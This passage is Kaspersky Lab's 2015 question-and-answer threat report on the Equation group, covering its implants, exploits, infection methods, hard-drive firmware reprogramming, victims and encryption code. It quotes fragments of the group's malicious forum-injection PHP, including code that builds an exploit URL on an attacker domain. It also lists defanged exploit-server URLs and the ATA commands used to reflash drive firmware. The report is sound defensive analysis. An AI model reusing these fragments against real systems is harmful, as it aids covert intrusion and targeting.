{
    "title": "Equation_group_questions_and_answers",
    "text": "Version: 1.5  \nFebruary 2015\n#EquationAPT  \n#TheSAS2015  EQUATION GROUP: \nQUESTIONS AND \nANSWERS2\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nTable of contents\n1. What is the Equation group?  .......................................................................... 3\n2.  Why do you call them the “Equation” group?  ................................................ 3\n3.  What attack tools and malware does the Equation group use?  .................. 4\n4. What is DOUBLEFANTASY? ............................................................................. 6\n5. What is EQUATIONDRUG?  .............................................................................. 8\n6. What is GRAYFISH?  ......................................................................................... 9\n7. What is Fanny?  ............................................................................................. 12\n8.  What exploits does the Equation group use?  ............................................. 14\n9.  How do victims get infected by EQUATION group malware?  ...................... 15\n10.  What is the most sophisticated thing about the EQUATION group?  ......... 16\n11.  Have you observed any artifacts indicating who is behind \nthe EQUATION group?  .................................................................................. 19\n12. How many victims are there?  ...................................................................... 20\n13.  Have you seen any non-Windows malware from the Equation group?  .....22\n14.  What C&C infrastructure do the Equation group implants use?  ............... 23\n15.  How do victims get selected for infection by the EQUATION group?  ......... 23\n16.  What kind of encryption algorithms are used by the EQUATION group?  ...27\n17.  How does the EQUATION group’s attack platforms  \ncompare with Regin?  ................................................................................... 30\n18. How did you discover this malware?  .......................................................... 31\nIndicators of compromise (“one of each”)  ......................................................... 323\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n1. What is the Equation group?\nThe Equation group is a highly sophisticated threat actor that has been \nengaged in multiple CNE (computer network exploitation) operations dating \nback to 2001, and perhaps as early as 1996. The Equation group uses multiple \nmalware platforms, some of which surpass the well-known “Regin” threat in \ncomplexity and sophistication. The Equation group is probably one of the most \nsophisticated cyber attack groups in the world; and they are the most advanced \nthreat actor we have seen.\n2.  Why do you call them the “ Equation ” \ngroup?\nWe call this threat actor the Equation group because of their love for encryption \nalgorithms and obfuscation strategies and the sophisticated methods used \nthroughout their operations. In general, the Equation group uses a specific \nimplementation of the RC5 encryption algorithm throughout their malware. \nSome of the most recent modules use RC6, RC4 and AES too, in addition to \nother cryptographic functions and hashes.\nOne technique in particular caught our attention and reminded us of another \ncomplex malware, Gauss. The GrayFish loader uses SHA-256 one thousand \ntimes over the unique NTFS object ID of the victim’s Windows folder to decrypt \nthe next stage from the registry. This uniquely ties the infection to the specific \nmachine, and means the payload cannot be decrypted without knowing the \nNTFS object ID.4\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n3.  What attack tools and malware does \nthe Equation group use?\nSo far, we’ve identified several malware platforms used exclusively by the Equation \ngroup. \nThey are:\n•\tEQUATIONDRUG  – A very complex attack platform used by the group on \nits victims. It supports a module plugin system, which can be dynamically \nuploaded and unloaded by the attackers.\n•\tDOUBLEFANTASY  – A validator-style Trojan, designed to confirm the target \nis the intended one. If the target is confirmed, they get upgraded to a more \nsophisticated platform such as EQUATIONDRUG or GRAYFISH.\n•\tEQUESTRE  – Same as EQUATIONDRUG .\n•\tTRIPLEFANTASY  – Full-featured backdoor sometimes used in tandem with \nGRAYFISH. Looks like an upgrade of DOUBLEFANTASY , and is possibly a more \nrecent validator-style plugin.\n•\tGRAYFISH  – The most sophisticated attack platform from the EQUATION \ngroup. It resides completely in the registry, relying on a bootkit to gain \nexecution at OS startup. \n•\tFANNY  – A computer worm created in 2008 and used to gather information \nabout targets in the Middle East and Asia. Some victims appear to have been \nupgraded first to DoubleFantasy, and then to the EQUATIONDRUG system. \nFanny used exploits for two zero-day vulnerabilities which were later discovered \nwith Stuxnet.\n•\tEQUATIONLASER  – An early implant from the EQUATION group, used around \n2001-2004. Compatible with Windows 95/98, and created sometime between \nDOUBLEFANTASY and EQUATIONDRUG.5\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n6\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n4. What is DOUBLEFANTASY?\nThe Equation group uses an implant known as DoubleFantasy (the internal \nKaspersky Lab name) for the validation of their victims. The implant serves \ntwo purposes:\n•\tto confirm if the victim is interesting; If so, the victim is upgraded \nto the EquationDrug or GrayFish platforms\n•\tto keep a backdoor into a potentially interesting target’s computer\nDoubleFantasy keeps an internal version number in its configuration block, \ntogether with other data such as legitimate hosts used to validate the internet \nconnection (e.g.: microsoft.com , yahoo.com ) and C&Cs.\n \nDecrypted DoubleFantasy configuration block\nIn the configuration block above, one can easily spot the internal version 8.2.0.6 .\nDecrypting configuration blocks from all known DoubleFantasy samples, we \nobtained the following internal version numbers:\n•\t8.1.0.4\n•\t008.002.000.006\n•\t008.002.001.001\n•\t008.002.001.004\n•\t008.002.001.04A  (subversion “IMIL3.4.0-IMB1.8.0”)\n•\t008.002.002.000\n•\t008.002.003.000\n•\t008.002.005.000\n•\t008.002.006.0007\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n•\t011.000.001.001\n•\t012.001.000.000\n•\t012.001.001.000\n•\t012.002.000.001\n•\t012.003.001.000\n•\t012.003.004.000\n•\t012.003.004.001\n•\t013.000.000.000\nInterestingly, the most popular versions are 8 and 12:\nConsidering the latest version of DoubleFantasy is 13 and we have only identified \n4 major versions, we are probably seeing only a small part of the group’s activity.8\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n5. What is EQUATIONDRUG?\nEQUATIONDRUG is one of the group’s most complex espionage platforms. \nThe platform was developed between 2003 and 2013 and subsequently \nreplaced by GrayFish. It appears to have been created as an upgrade from \nthe EQUATIONLASER platform.\nA victim doesn’t immediately get infected with EQUATIONDRUG. First, the \nattackers infect them with DOUBLEFANTASY , which is a validator-style plugin. \nIf the victim is confirmed as interesting to the attackers, the EQUATIONDRUG \ninstaller is delivered.\nBy default, a core set of modules is installed onto the target’s computer together \nwith EQUATIONDRUG, giving attackers full control over the operating system . In \ncases where the basic features of the malware are not enough, EquationDrug \nsupports the addition of new plugins to extend its functionality. We found 35 \ndifferent plugins for EquationDrug and 18 drivers.9\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nEquationDrug’s core modules, designed for hooking deep into the OS, do not \ncontain a trusted digital signature and cannot be run directly on modern operating \nsystems. The code checks whether the OS version predates Windows XP/2003. \nSome of the plugins were designed originally for use on Windows 95/98/ME.\nIf the target is using a modern operating system such as Windows 7, the attackers \nuse the TripleFantasy or GrayFish platforms. \nEquationDrug has an integrated countdown timer, presumably designed to self-\ndestruct if commands are not received from the C&C for a period of time (several \nmonths).\nThe information stolen from the PC and prepared for transmission to the C&C \nis stored in encrypted form throughout several fake font files (*.FON) inside the \nWindows\\Fonts folder on the victim's computer.\n6. What is GRAYFISH?\nGRAYFISH is the most modern and sophisticated malware implant from \nthe Equation group. It is designed to provide an effective (almost “invisible”) \npersistence mechanism, hidden storage and malicious command execution \ninside the Windows operating system.\nBy all indications, GrayFish was developed between 2008 and 2013 and is \ncompatible with all modern versions of Microsoft’s operating systems, including \nWindows NT 4.0, Windows 2000, Windows XP , Windows Vista, Windows 7 and 8 – \nboth 32-bit and 64-bit versions.10\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nGrayFish includes a highly sophisticated bootkit, which is more complex than any \nwe’ve seen before. This suggests developers of the highest caliber are behind its \ncreation.\nWhen the computer starts, GrayFish hijacks the OS loading mechanisms by injecting \nits code into the boot record . This allows it to control the launching of Windows \nat each stage. In fact, after infection, the computer is not run by itself more: it is \nGrayFish that runs it step by step, making the necessary changes on the fly .\nAfter GrayFish starts Windows, it launches a multi-stage mechanism (four to five \nstages) of decryption to achieve code execution within the Windows environment. \nIt then runs the functional modules that are stored inside the Windows registry. \nEach stage decodes and executes the next, and the entire platform will only start \nafter successful execution of all levels. If an error happens during launch, the \nentire GrayFish platform self-destructs.11\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n \nThe GrayFish bootloader mechanism12\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nTo store stolen information, as well as its own auxiliary information, GrayFish \nimplements its own encrypted Virtual File System (VFS) inside the Windows registry. \nTo bypass modern OS security mechanisms that block the execution of untrusted \ncode in kernel mode, GrayFish exploits several legitimate drivers, including one \nfrom the CloneCD program. This driver ( ElbyCDIO.sys ) contains a vulnerability which \nGrayFish exploits to achieve kernel-level code execution. Despite the fact that the \nvulnerability was discovered in 2009 , the digital signature has not yet been revoked.\nThe GrayFish implementation appears to have been designed to make it invisible \nto antivirus products. When used together with the bootkit, all the modules as well \nas the stolen data are stored in encrypted form in the registry and dynamically \ndecrypted and executed. There are no malicious executable modules at all on \nthe filesystem of an infected system.\nAn interesting observation: the first stage GRAYFISH loader computes the SHA-256  \nhash of the NTFS of system folder (%Windows% or %System%) Object_ID one \nthousand times. The result is used as an AES decryption key for the next stage. \nThis is somewhat similar to Gauss, which computed the MD5 hash over the \nname of its target folder 10,000 times and used the result as the decryption key.\n7. What is Fanny?\nFanny is a computer worm created by the Equation group in 2008 and distributed \nthroughout the Middle East and Asia. Fanny used two zero-day exploits , which \nwere later uncovered during the discovery of Stuxnet. To spread, it used the Stuxnet \nLNK exploit and USB sticks. For escalation of privilege, Fanny used a vulnerability \npatched by the Microsoft bulletin MS09-025, which from 2009 was also used in \none of the early versions of Stuxnet. \n \nLNK exploit as used by Fanny13\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nIt’s important to point out that these two exploits were used in Fanny before \nthey were integrated into Stuxnet , indicating the EQUATION group had access \nto these zero-days before the Stuxnet group. Actually, the similar type of usage \nof both exploits together in different computer worms, at around the same time, \nindicates that the EQUATION group and the Stuxnet developers are either the \nsame or working closely together.\n \nFanny malware diagram\nThe main purpose of Fanny appears to have been the mapping of air-gapped \nnetworks . For this, it used a unique USB-based command and control mechanism. \nWhen a USB stick is infected, Fanny creates a hidden storage area on the stick. \nIf it infects a computer without an internet connection, it will collect basic system \ninformation and save it onto the hidden area of the stick. Later, when a stick \ncontaining hidden information is plugged into an internet-connected computer \ninfected by Fanny, the data will be scooped up from the hidden area and sent to \nthe C&C. If the attackers want to run commands on the air-gapped networks, they \ncan save these commands in the hidden area of the USB stick. When the stick is \nplugged into the air-gapped computer, Fanny will recognize the commands and 14\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nexecute them. This effectively allowed the Equation group to run commands inside \nair-gapped networks through the use of infected USB sticks, and also map the \ninfrastructure of such networks.\nThe Fanny C&C server is currently sinkholed by Kaspersky Lab. The victims map \nlooks as follows:\n \n2014-2015 Fanny sinkhole statistics\n8.  What exploits does the Equation \ngroup use?\nWe observed the following exploits used by the Equation group in their malware:\n•\tWindows Kernel EoP exploit used in Stuxnet 2009 ( atempsvc.ocx ), \nfixed with MS09-025. (CVE unknown).\n•\tTTF exploit fixed with MS12-034 (possibly CVE-2012-0159).\n•\tTTF exploit fixed with MS13-081 (possibly CVE-2013-3894).\n•\tLNK vulnerability as used by Stuxnet. (CVE-2010-2568).\n•\tCVE-2013-3918 (Internet Explorer).15\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n•\tCVE-2012-1723 (Java).\n•\tCVE-2012-4681 (Java).\nAt least four of these were used as zero-days  by the EQUATION group. In addition \nto these, we observed the use of unknown exploits, possibly zero-day, against \nFirefox 17, as used in the TOR Browser.\nAn interesting case is the use of CVE-2013-3918, which was originally used \nby the APTgroup behind the 2009 Aurora attack. The EQUATION group captured \ntheir exploit and repurposed it to target government users in Afghanistan.\n9.  How do victims get infected by EQUATION \ngroup malware?\nThe Equation group relies on multiple techniques to infect their victims. These \ninclude:\n•\tSelf-replicating (worm) code – Fanny\n•\tPhysical media, CD-ROMs\n•\tUSB sticks + exploits\n•\tWeb-based exploits\nThe attacks that use physical media (CD-ROMs) are particularly interesting \nbecause they indicate the use of a technique known as “interdiction”, where \nthe attackers intercept shipped goods and replace them with Trojanized versions. \nOne such incident involved targeting participants at a scientific conference \nin Houston. Upon returning home, some of the participants received by mail a copy of \nthe conference proceedings, together with a slideshow including various conference \nmaterials. The compromised CD-ROM used “ autorun.inf ” to execute an installer \nthat began by attempting to escalate privileges using two known EQUATION group \nexploits. Next, it attempted to run the group’s DOUBLEFANTASY implant and install \nit onto the victim’s machine. The exact method by which these CDs were interdicted \nis unknown. We do not believe the conference organizers did this on purpose. At the \nsame time, the super-rare DOUBLEFANTASY malware, together with its installer with \ntwo zero-day exploits, don’t end up on a CD by accident.\nAnother example is a Trojanized Oracle installation CD that contains \nan EQUATIONLASER Trojan dropper alongside the Oracle installer.16\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nHere’s a look at a typical infection cycle:\n \nInfection lifecycle: from web exploit to EquationDrug and GrayFish\n10.  What is the most sophisticated thing \nabout the EQUATION group?\nAlthough the implementation of their malware systems is incredibly complex, \nsurpassing even Regin in sophistication, there is one aspect of the EQUATION \ngroup’s attack technologies that exceeds anything we have ever seen before. \nThis is the ability to infect the hard drive firmware.\nWe were able to recover two HDD firmware reprogramming modules from the \nEQUATIONDRUG and GRAYFISH platforms. The EQUATIONDRUG HDD firmware \nreprogramming module has version 3.0.1 while the GRAYFISH reprogramming \nmodule has version 4.2.0. These were compiled in 2010 and 2013, respectively, \nif we are to trust the PE timestamps.17\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nThe EQUATION group HDD firmware reprogramming plugin has the internal \nID 80AA , which is a unique number in the groups’ plugin ID table. This allows \nother plugins to identify and use it as required. Both 32- and 64-bit versions \nof the plugin were found.\nThe plugin supports two main functions: reprogramming the HDD firmware \nwith a custom payload from the EQUATION group, and providing an API into \na set of hidden sectors  (or data storage) of the hard drive. This achieves several \nimportant things:\n•\tExtreme persistence that survives disk formatting and OS reinstall.\n•\tAn invisible, persistent storage hidden inside the hard drive.\nThe plugin version 3 has the ability to reprogram six drive “categories”:\n•\t“Maxtor ”, “Maxtor\tSTM ”\n•\t“ST”, “Maxtor\tSTM ”, <Seagate Technology>\n•\t“WDC\tWD ”, <Western Digital Technologies, Inc>\n•\t“SAMSUNG ”, <SAMSUNG ELECTRONICS CO. LTD>\n•\t“WDC\tWD ”, <Western Digital Technologies, Inc> additional vendor specific \nchecks used (spawns two subclasses)\n•\t<Seagate Technology>\nThe plugin version 4 is more complex and can reprogram 12 drive “categories”.\n \nPlugin version 4 infection “capabilities” table18\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nThe classes supported are:\n•\t“WDC\tWD ”, <Western Digital Technologies Inc> additional vendor specific \nchecks used\n•\t“ST”, “Maxtor\tSTM ”, “SEAGATE\tST ”, <Seagate Technology>\n•\t“SAMSUNG ”, <SAMSUNG ELECTRONICS CO., LTD.>\n•\t“WDC\tWD ”, <Western Digital Technologies, Inc.> additional vendor specific \nchecks used\n•\t<HGST a Western Digital Company>, “ IC”, “IBM”, “Hitachi ”, “HTS”, “HTE”, \n“HDS”, “HDT”, “ExcelStor ”\n•\t“Max”, “Maxtor\tSTM ”\n•\t<MICRON TECHNOLOGY , INC.>, “ C300 ”, “M4”\n•\t<HGST a Western Digital Company>, <TOSHIBA CORPORATION>\n•\t“OCZ”, “OWC”, “Corsair ”, “Mushkin ” additional vendor specific checks used\n•\t<Samsung Electronics Co., Ltd., Storage System Division>, <Seagate \nTechnology>, <SAMSUNG ELECTRONICS CO., LTD.> +additional checks\n•\t<TOSHIBA CORPORATION COMPUTER DIVISION>, “ TOSHIBA\tM ” +checks\n•\t<Seagate Technology>, “ ST”\nThe main function to reflash the HDD firmware receives an external payload, which \ncan be compressed by LZMA. The disk is targeted by a specific serial number and \nreprogrammed by a series of ATA commands. For example, in the case of Seagate \ndrives, we see a chain of commands: “FLUSH CACHE” (E7)  → “DOWNLOAD \nMICROCODE” (92) → “IDENTIFY DEVICE” (EC) → WRITE “LOG EXT” (3F). Depending \non the reflashing request, there might be some unclear data manipulations written \nto the drive using “WRITE LOG EXT” (3F). For WD drives, there is a sub-routine \nsearching for ARM NOP opcodes in read data, and then used further in following \nwrites. Overall, the plugin uses a lot of undocumented, vendor-specific ATA \ncommands, for the drives mentioned above as well as all the others.\nThe EQUATION group’s HDD firmware reprogramming module is extremely rare. \nDuring our research, we’ve only identified a few victims who were targeted by this \nmodule. This indicates that it is probably only kept for the most valuable victims \nor for some very unusual circumstances.19\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n11.  Have you observed any artifacts \nindicating who is behind \nthe EQUATION group?\nWith threat actor groups as skilled as the Equation team, mistakes are rare. \nNevertheless, they do happen. Some of the keywords forgotten in the modules \nthat we analyzed include:\n•\tSKYHOOKCHOW\n•\tprkMtx  – unique mutex used by the Equation group’s exploitation library \n(“PrivLib”)\n•\t“SF” – as in “ SFInstall ”, “SFConfig ”\n•\t“UR”, “URInstall” – “ Performing UR-specific post-install... ”\n•\t“implant” – from “ Timeout waiting for the “canInstallNow” event from the  \nimplant-specific EXE! ”\n•\tSTEALTHFIGHTER –  \n(VTT/82055898/ STEALTHFIGHTER /2008-10-16/14:59:06.229-04:00)\n•\tDRINKPARSLEY –  \n(Manual/ DRINKPARSLEY /2008-09-30/10:06:46.468-04:00)\n•\tSTRAITACID –  \n(VTT/82053737/ STRAITACID /2008-09-03/10:44:56.361-04:00)\n•\tLUTEUSOBSTOS –  \n(VTT/82051410/ LUTEUSOBSTOS /2008-07-30/17:27:23.715-04:00) \n•\tSTRAITSHOOTER STRAITSHOOTER30.exe\n•\tDESERTWINTER –  \nc:\\desert~2\\desert~3\\objfre_w2K_x86\\i386\\ DesertWinterDriver.pdb\n•\tGROK – standalonegrok_2.1.1.1\n•\t“RMGREE5” – c:\\users\\rmgree5\\...20\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nInterestingly, the VTT strings above appear to contain a timestamp and an \ninfection counter. Between four events – 10 October 2008, 30th of July 2008, \n3rd of September 2008 and 30 of September 2008 – we count an average of \n2000 infections per month, if the serial number increases linearly. This could \nindicate that the EQUATION group hits about 2000 users per month, although \nit’s possible some “uninteresting” victims may be disinfected.\nNote :  The codename GROK appears in several documents published by Der Spiege l, \nwhere “a keylogger” is mentioned. Our analysis indicates EQUATIONGROUP’s \nGROK  plugin is indeed a keylogger on steroids that can perform many other \nfunctions. \n12. How many victims are there?\nThe victims of the Equation group were observed in more than 30 countries, \nincluding Iran, Russia , Syria , Afghanistan , Kazakhstan , Belgium , Somalia , \nHong Kong , Libya , United Arab Emirates , Iraq, Nigeria , Ecuador , Mexico , \nMalaysia , United States , Sudan , Lebanon , Palestine , France , Germany , \nSingapore , Qatar , Pakistan , Yemen , Mali , Switzerland , Bangladesh , \nSouth Africa , Philippines , United Kingdom , India  and Brazil . \n21\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nVictims generally fall into the following categories:\n•\tGovernments and diplomatic institutions\n•\tTelecommunication\n•\tAerospace\n•\tEnergy\n•\tNuclear research\n•\tOil and gas\n•\tMilitary\n•\tNanotechnology\n•\tIslamic activists and scholars\n•\tMass media\n•\tTransportation \n•\tFinancial institutions\n•\tCompanies developing cryptographic technologies\nCombining statistics from KSN and our sinkhole, we counted more than \n500 victims  worldwide. A lot of infections have been observed on servers, often \ndomain controllers, data warehouses, website hosting and other types of servers. \nAt the same time, the infections have a self-destruct mechanism, so we can \nassume there were probably tens of thousands of infections around the world \nthroughout the history of the Equation group’s operations. \nAs an interesting note, some of the “patients zero” of Stuxnet seem to have been \ninfected by the EQUATION group. It is quite possible that the EQUATION group \nmalware was used to deliver the STUXNET payload.22\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n13.  Have you seen any non-Windows \nmalware from the Equation group?\nAll the malware we have collected so far is designed to work on Microsoft’s \nWindows operating system. However, there are signs that non-Windows malware \ndoes exist. For instance, one of the sinkholed C&C domains is currently receiving \nconnections from a large pool of victims in China that appear to be Mac OS X \ncomputers (based on the user-agent). \nThe malware callbacks are consistent with the DOUBLEFANTASY schema, which \nnormally injects into the system browser (for instance, Internet Explorer on \nWindows). \nThe callbacks for the suspected Mac OS X versions have the following user \nagents:\n•\tMozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2 ) AppleWebKit/536.26.17 \n(KHTML, like Gecko) Version/6.0.2 Safari/536.26.17\n•\tMozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0 ) Gecko/20100101 \nFirefox/21.0\n•\tMozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3 ) AppleWebKit/536.28.10 \n(KHTML, like Gecko) Version/6.0.3 Safari/536.28.10\nThis leads us to believe that a Mac OS X version of DOUBLEFANTASY also exists.\nAdditionally, we observed that one of the malicious forum injections, in the form \nof a PHP script, takes special precautions to show a different type of HTML code to \nApple iPhone visitors. Unlike other cases, such as visitors from Jordan, which does \nnot get targeted, iPhone visitors are redirected to the exploit server, suggesting the \nability to infect iPhones as well.23\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n14.  What C&C infrastructure do the Equation \ngroup implants use?\nThe Equation group uses a vast C&C infrastructure that includes more than \n300 domains  and more than 100 servers . The servers are hosted in multiple \ncountries, including the US, UK, Italy, Germany, Netherlands, Panama, Costa Rica, \nMalaysia, Colombia and Czech Republic.\nAll C&C domains appear to have been registered through the same two major \nregistrars, using “Domains By Proxy” to mask the registrant’s information.\nKaspersky Lab is currently sinkholing a couple dozen of the 300 C&C servers.\n15.  How do victims get selected for infection \nby the EQUATION group?\nThe EQUATION group sometimes selects its victims with surgical precision. \nWhen precision is not possible, the victims are targeted by a validator \n(DOUBLEFANTASY) implant and subsequently disinfected if they do not appear to \nbe “interesting” to the attackers. \nHere are some web-based targeting examples from the Equation group:\nOn March 2, 2013, a Kaspersky Lab user browsing an online forum was attacked \nwith an exploit from one of the Equation group’s exploitation servers:\n2013-03-02 –  \ntechnicalconsumerreports[.]com /modular/assemble.php?params=YoGKKdExT[snip]\ncS5kS5t0bvGQyB8miDu+Agn – detected HEUR:Exploit.Script.Generic\nThe attack was unsuccessful as it was caught by our product and the user was \nprotected. The attack was targeting Firefox 17 (TOR Browser), using an unknown \nexploit that we have not recovered.\nLooking further, we identified a few other known Equation servers used in similar \nattacks even earlier:\n2012-12-11 –  \ntechnology-revealed[.]com /diagram/navigate.html?overlay=AL[ snip ]OISn6sI1&sn=d1[ SNIP ]dd24\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nThese attacks were delivered in several ways – for example, while the user \nvisited a number of Islamic Jihadist discussion forums , or via advertisements on \npopular websites in the Middle East.\nThe forums in question appear to have been compromised by a specific PHP \nscript that exploited only authenticated visitors . We were able to obtain one of \nthese PHP scripts embedded in a discussion forum:\n \nMalicious PHP script injected into hacked discussion forums\nThis PHP script provides a multitude of interesting information about the attacks. \nIt was first designed to work as part of vBulletin, a commercial forum platform. It \nspecifically checks if the visitor’s username MD5 matches two values:\n•\t84b8026b3f5e6dcfb29e82e0b0b0f386  – MD5 of “Unregistered”\n•\te6d290a03b70cfa5d4451da444bdea39  – unknown MD5\nIn practice, this means that only logged-in users will be exploited. Next, the PHP \nexploitation script checks if the user comes from a specific address range:\n•\tif(preg_match('/^( 64.38.3.50|195.28.|94.102.|91.93.|41.130.|212.118.|7\n9.173.|85.159.|94.249.|86.108. )/',IPADDRESS)){return \"\";}25\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nConverting the ranges to their respective countries (except for 64.38.3.50 , which \nis the only specific IP mentioned) we get the following TOP 3 countries that will \nNOT be exploited :\n1. Jordan\n2. Turkey\n3. Egypt\nThis means that the attackers have taken special care not to infect users visiting \nfrom certain ISPs in these countries. If the visitors are from any other IP range, \nthe PHP script constructs an exploitation URL which includes the logged in \nvBulletin forum name:\n$htt=\"http:// technology-revealed[.]com /expand/order.php?design=ABRSRgDQlkUALAxGANDrRu\nQQofe6Y0THS8E3hfBC+M+k7CdBmTH5gAkLvgV8EV3ULW+7KoUjbJ4UOFU6SVOtgEK7zTgPPNoDH\nz4vKecDGe7OzDmJlvwKvc5uYg/I/5x9\"; \n$htt=$htt.\"&sn=\" .bin2hex(substr($u,0,14)) ;\nThe vBulletin forum username is stored in hex, as the “ sn=” parameter to the \nexploit site. The exploit site can choose to hit the visitor with an exploit depending \non the username, meaning that the attackers are taking great care to infect only \nvery specific targets on these forums.\nInterestingly, the PHP script produces a different HTML page for iPhone visitors:\n•\tif (preg_match('/ iPhone /',$_SERVER['HTTP_USER_AGENT'])){$scroll='yes';}\nThis indicates that the exploit server is probably aware of iPhone visitors and can \ndeliver exploits for them as well; otherwise, the exploitation URL can simply be \nremoved for these visitors. \nMost recently, the attackers used Java exploits, delivered through a specific \nserver to visitors from the Middle East via advertising networks on popular \nwebsites. Here’s an example:\nstandardsandpraiserepurpose[.]com /login?qq=5eaae4d[ SNIP ]0563&rr=1&h=cc593a6bfd8e1e\n26c2734173f0ef75be3527a20526\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nThese 2013-2014 attacks make use of a new domain, \nstandardsandpraiserepurpose[.]com . Interesting to point out the similarity \nin the URL construction, with parameters “rr=1”, followed by “h=” a value \nresembling a SHA1 hash, possibly the specific targeted username. Other \ncollected “h=” values include the following:\n0044c9bfeaac9a51e77b921e3295dcd91ce3956a\n06cf1af1d018cf4b0b3e6cfffca3fbb8c4cd362e\n3ef06b6fac44a2a3cbf4b8a557495f36c72c4aa6\n5b1efb3dbf50e0460bc3d2ea74ed2bebf768f4f7\n930d7ed2bdce9b513ebecd3a38041b709f5c2990\ne9537a36a035b08121539fd5d5dcda9fb6336423\nConsidering the length and format, one might suspect they are a SHA1 hash, \nhowever, unlike the forum MD5 hashes, we couldn’t break any of them.\nThe exploits from standardsandpraiserepurpose[.]com  targeted several \nKaspersky Lab users and were all unsuccessful. The server attempts three \ndifferent Java exploits, containing the same payload stored as “info.dat” inside \nthe Java archive. These are simple downloaders that contain shellcode to \ndownload and execute the next stage from the C&C:\nUnfortunately, we weren’t able to download a copy of the next stage as the \nURL was already dead at the time of checking, or else it is only served and \nbuilt specifically for victims at specific IPs. Another unusual aspect of targeting \nincluded multiple infection attempts against users of a certain satellite internet \nprovider in Afghanistan. 27\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n16.  What kind of encryption algorithms \nare used by the EQUATION group?\nThe Equation group uses the RC5 and RC6 encryption algorithms quite \nextensively throughout their creations. They also use simple XOR, substitution \ntables, RC4 and AES. \nRC5 and RC6 are two encryption algorithms designed by Ronald Rivest in 1994 \nand 1998. They are very similar to each other, with RC6 introducing an additional \nmultiplication in the cypher to make it more resistant. Both cyphers use the same \nkey setup mechanism and the same magical constants named P and Q.\nThe RC5/6 implementation from Equation group’s malware is particularly \ninteresting and deserves special attention because of its specifics.\n \nEncryption-related code in a DoubleFantasy sample\nIn the screenshot above, one can observe the main loop of a RC6 key setup \nsubroutine extracted from one of the Equation group samples.28\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nThis is how it looks in pseudocode:\n\t*(_DWORD\t*)buf\t=\t 0xB7E15163 ;\n\ti\t=\t1;\n\tdo\n\t{\n\t*(_DWORD\t*)(buf\t+\t4\t*\ti)\t=\t*(_DWORD\t*)(buf\t+\t4\t*\ti\t–\t4)\t–\t 0x61C88647 ;\n\t++i;\n\t}\n\twhile\t(\ti\t<\t44\t);\nOne immediately notices the constants 0xB7E15163  and 0x61C88647 .\nHere’s what a normal RC6 key setup code looks like:\nvoid\tRC5_SETUP(unsigned\tchar\t*K)\t/*\tsecret\tinput\tkey\tK[0...b-1]\t*/\n{\tWORD\ti,\tj,\tk,\tu=w/8,\tA,\tB,\tL[c];\t\n\t/*\tInitialize\tL,\tthen\tS,\tthen\tmix\tkey\tinto\tS\t*/\n\tfor\t(i=b-1,L[c-1]=0;\ti!=-1;\ti--)\tL[i/u]\t=\t(L[i/u]<<8)+K[i];\n\tfor\t(S[0]= 0xB7E15163 ,i=1;\ti<t;\ti++)\tS[i]\t=\tS[i-1]+ 0x9E3779B9 ;\n[...]\n}\t\nSee: http://www.ussrback.com/crypto/misc/rc5ref.c\nInterestingly, the so-called Q constant usage is a bit different in the reference code.\nInside the Equation group malware, the encryption library uses a subtract operation \nwith the constant 0x61C88647 . In most publicly available RC5/6 code, this \nconstant is usually stored as 0x9E3779B9 , which is basically - 0x61C88647 . \nSince an addition is faster on certain hardware than a subtraction, it makes sense \nto store the constant in its negative form and adding it instead of subtracting.29\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n \nRC5 key setup reference document RFC2040 ( https://tools.ietf.org/html/rfc2040 ) \nSearching for “ 0x61C88647  0xB7E15163 ” on Google results in barely two pages \nof results, indicating this combination of constants is relatively rare. Most of the hits \nare on Chinese forums.\nSearching for the 2-inverse constant “ 0x9E3779B9  0xB7E15163 ” results in \na whopping 2500 hits.30\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nInterestingly, Regin implements the same constants in its RC5 code. Here’s how \nthe RC5 key setup code looks in Regin:\nIn total, we identified 20 different compiled versions of the RC5/6 code in \nthe Equation group malware. Although similar, the RC5 code is a bit different \nin Regin – none of the known Equation samples uses the “ C7 41 10 ” opcode \nfor setting up the P constant, as Regin does.\nThis suggests that the EQUATION group and the Regin group are two different \nentities.\n17.  How does the EQUATION group’s attack \nplatforms compare with Regin?\nTo attack their victims, the EQUATION group used several cyberespionage \nplatforms over the last 14 years. These include:\n•\tEQUATIONLASER – around 2001-2003\n•\tEQUATIONDRUG – 2003 to 2013\n•\tGRAYFISH 1.0 – 2008-present\n•\tGRAYFISH 2.0 – 2012-present31\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nWith EQUATIONDRUG, we observed the use of virtual file systems, which is also one \nof the trademarks of the Regin group. This was taken to further extreme in GRAYFISH, \nwhich exclusively uses the registry to store all malware-related modules and data in \nencrypted format. The GRAYFISH registry-based architecture is more flexible, stealthy \nand more complex than Regin, for several reasons:\n•\tIt doesn’t use any files on disk which can be easily spotted by anomaly finders.\n•\tEach registry branch is encrypted with its own key, making decryption impossible \nwithout having the whole package.\n•\tRegistry storage offers better granularity and less wasted space than Regin’s \nVFSes.\nIn 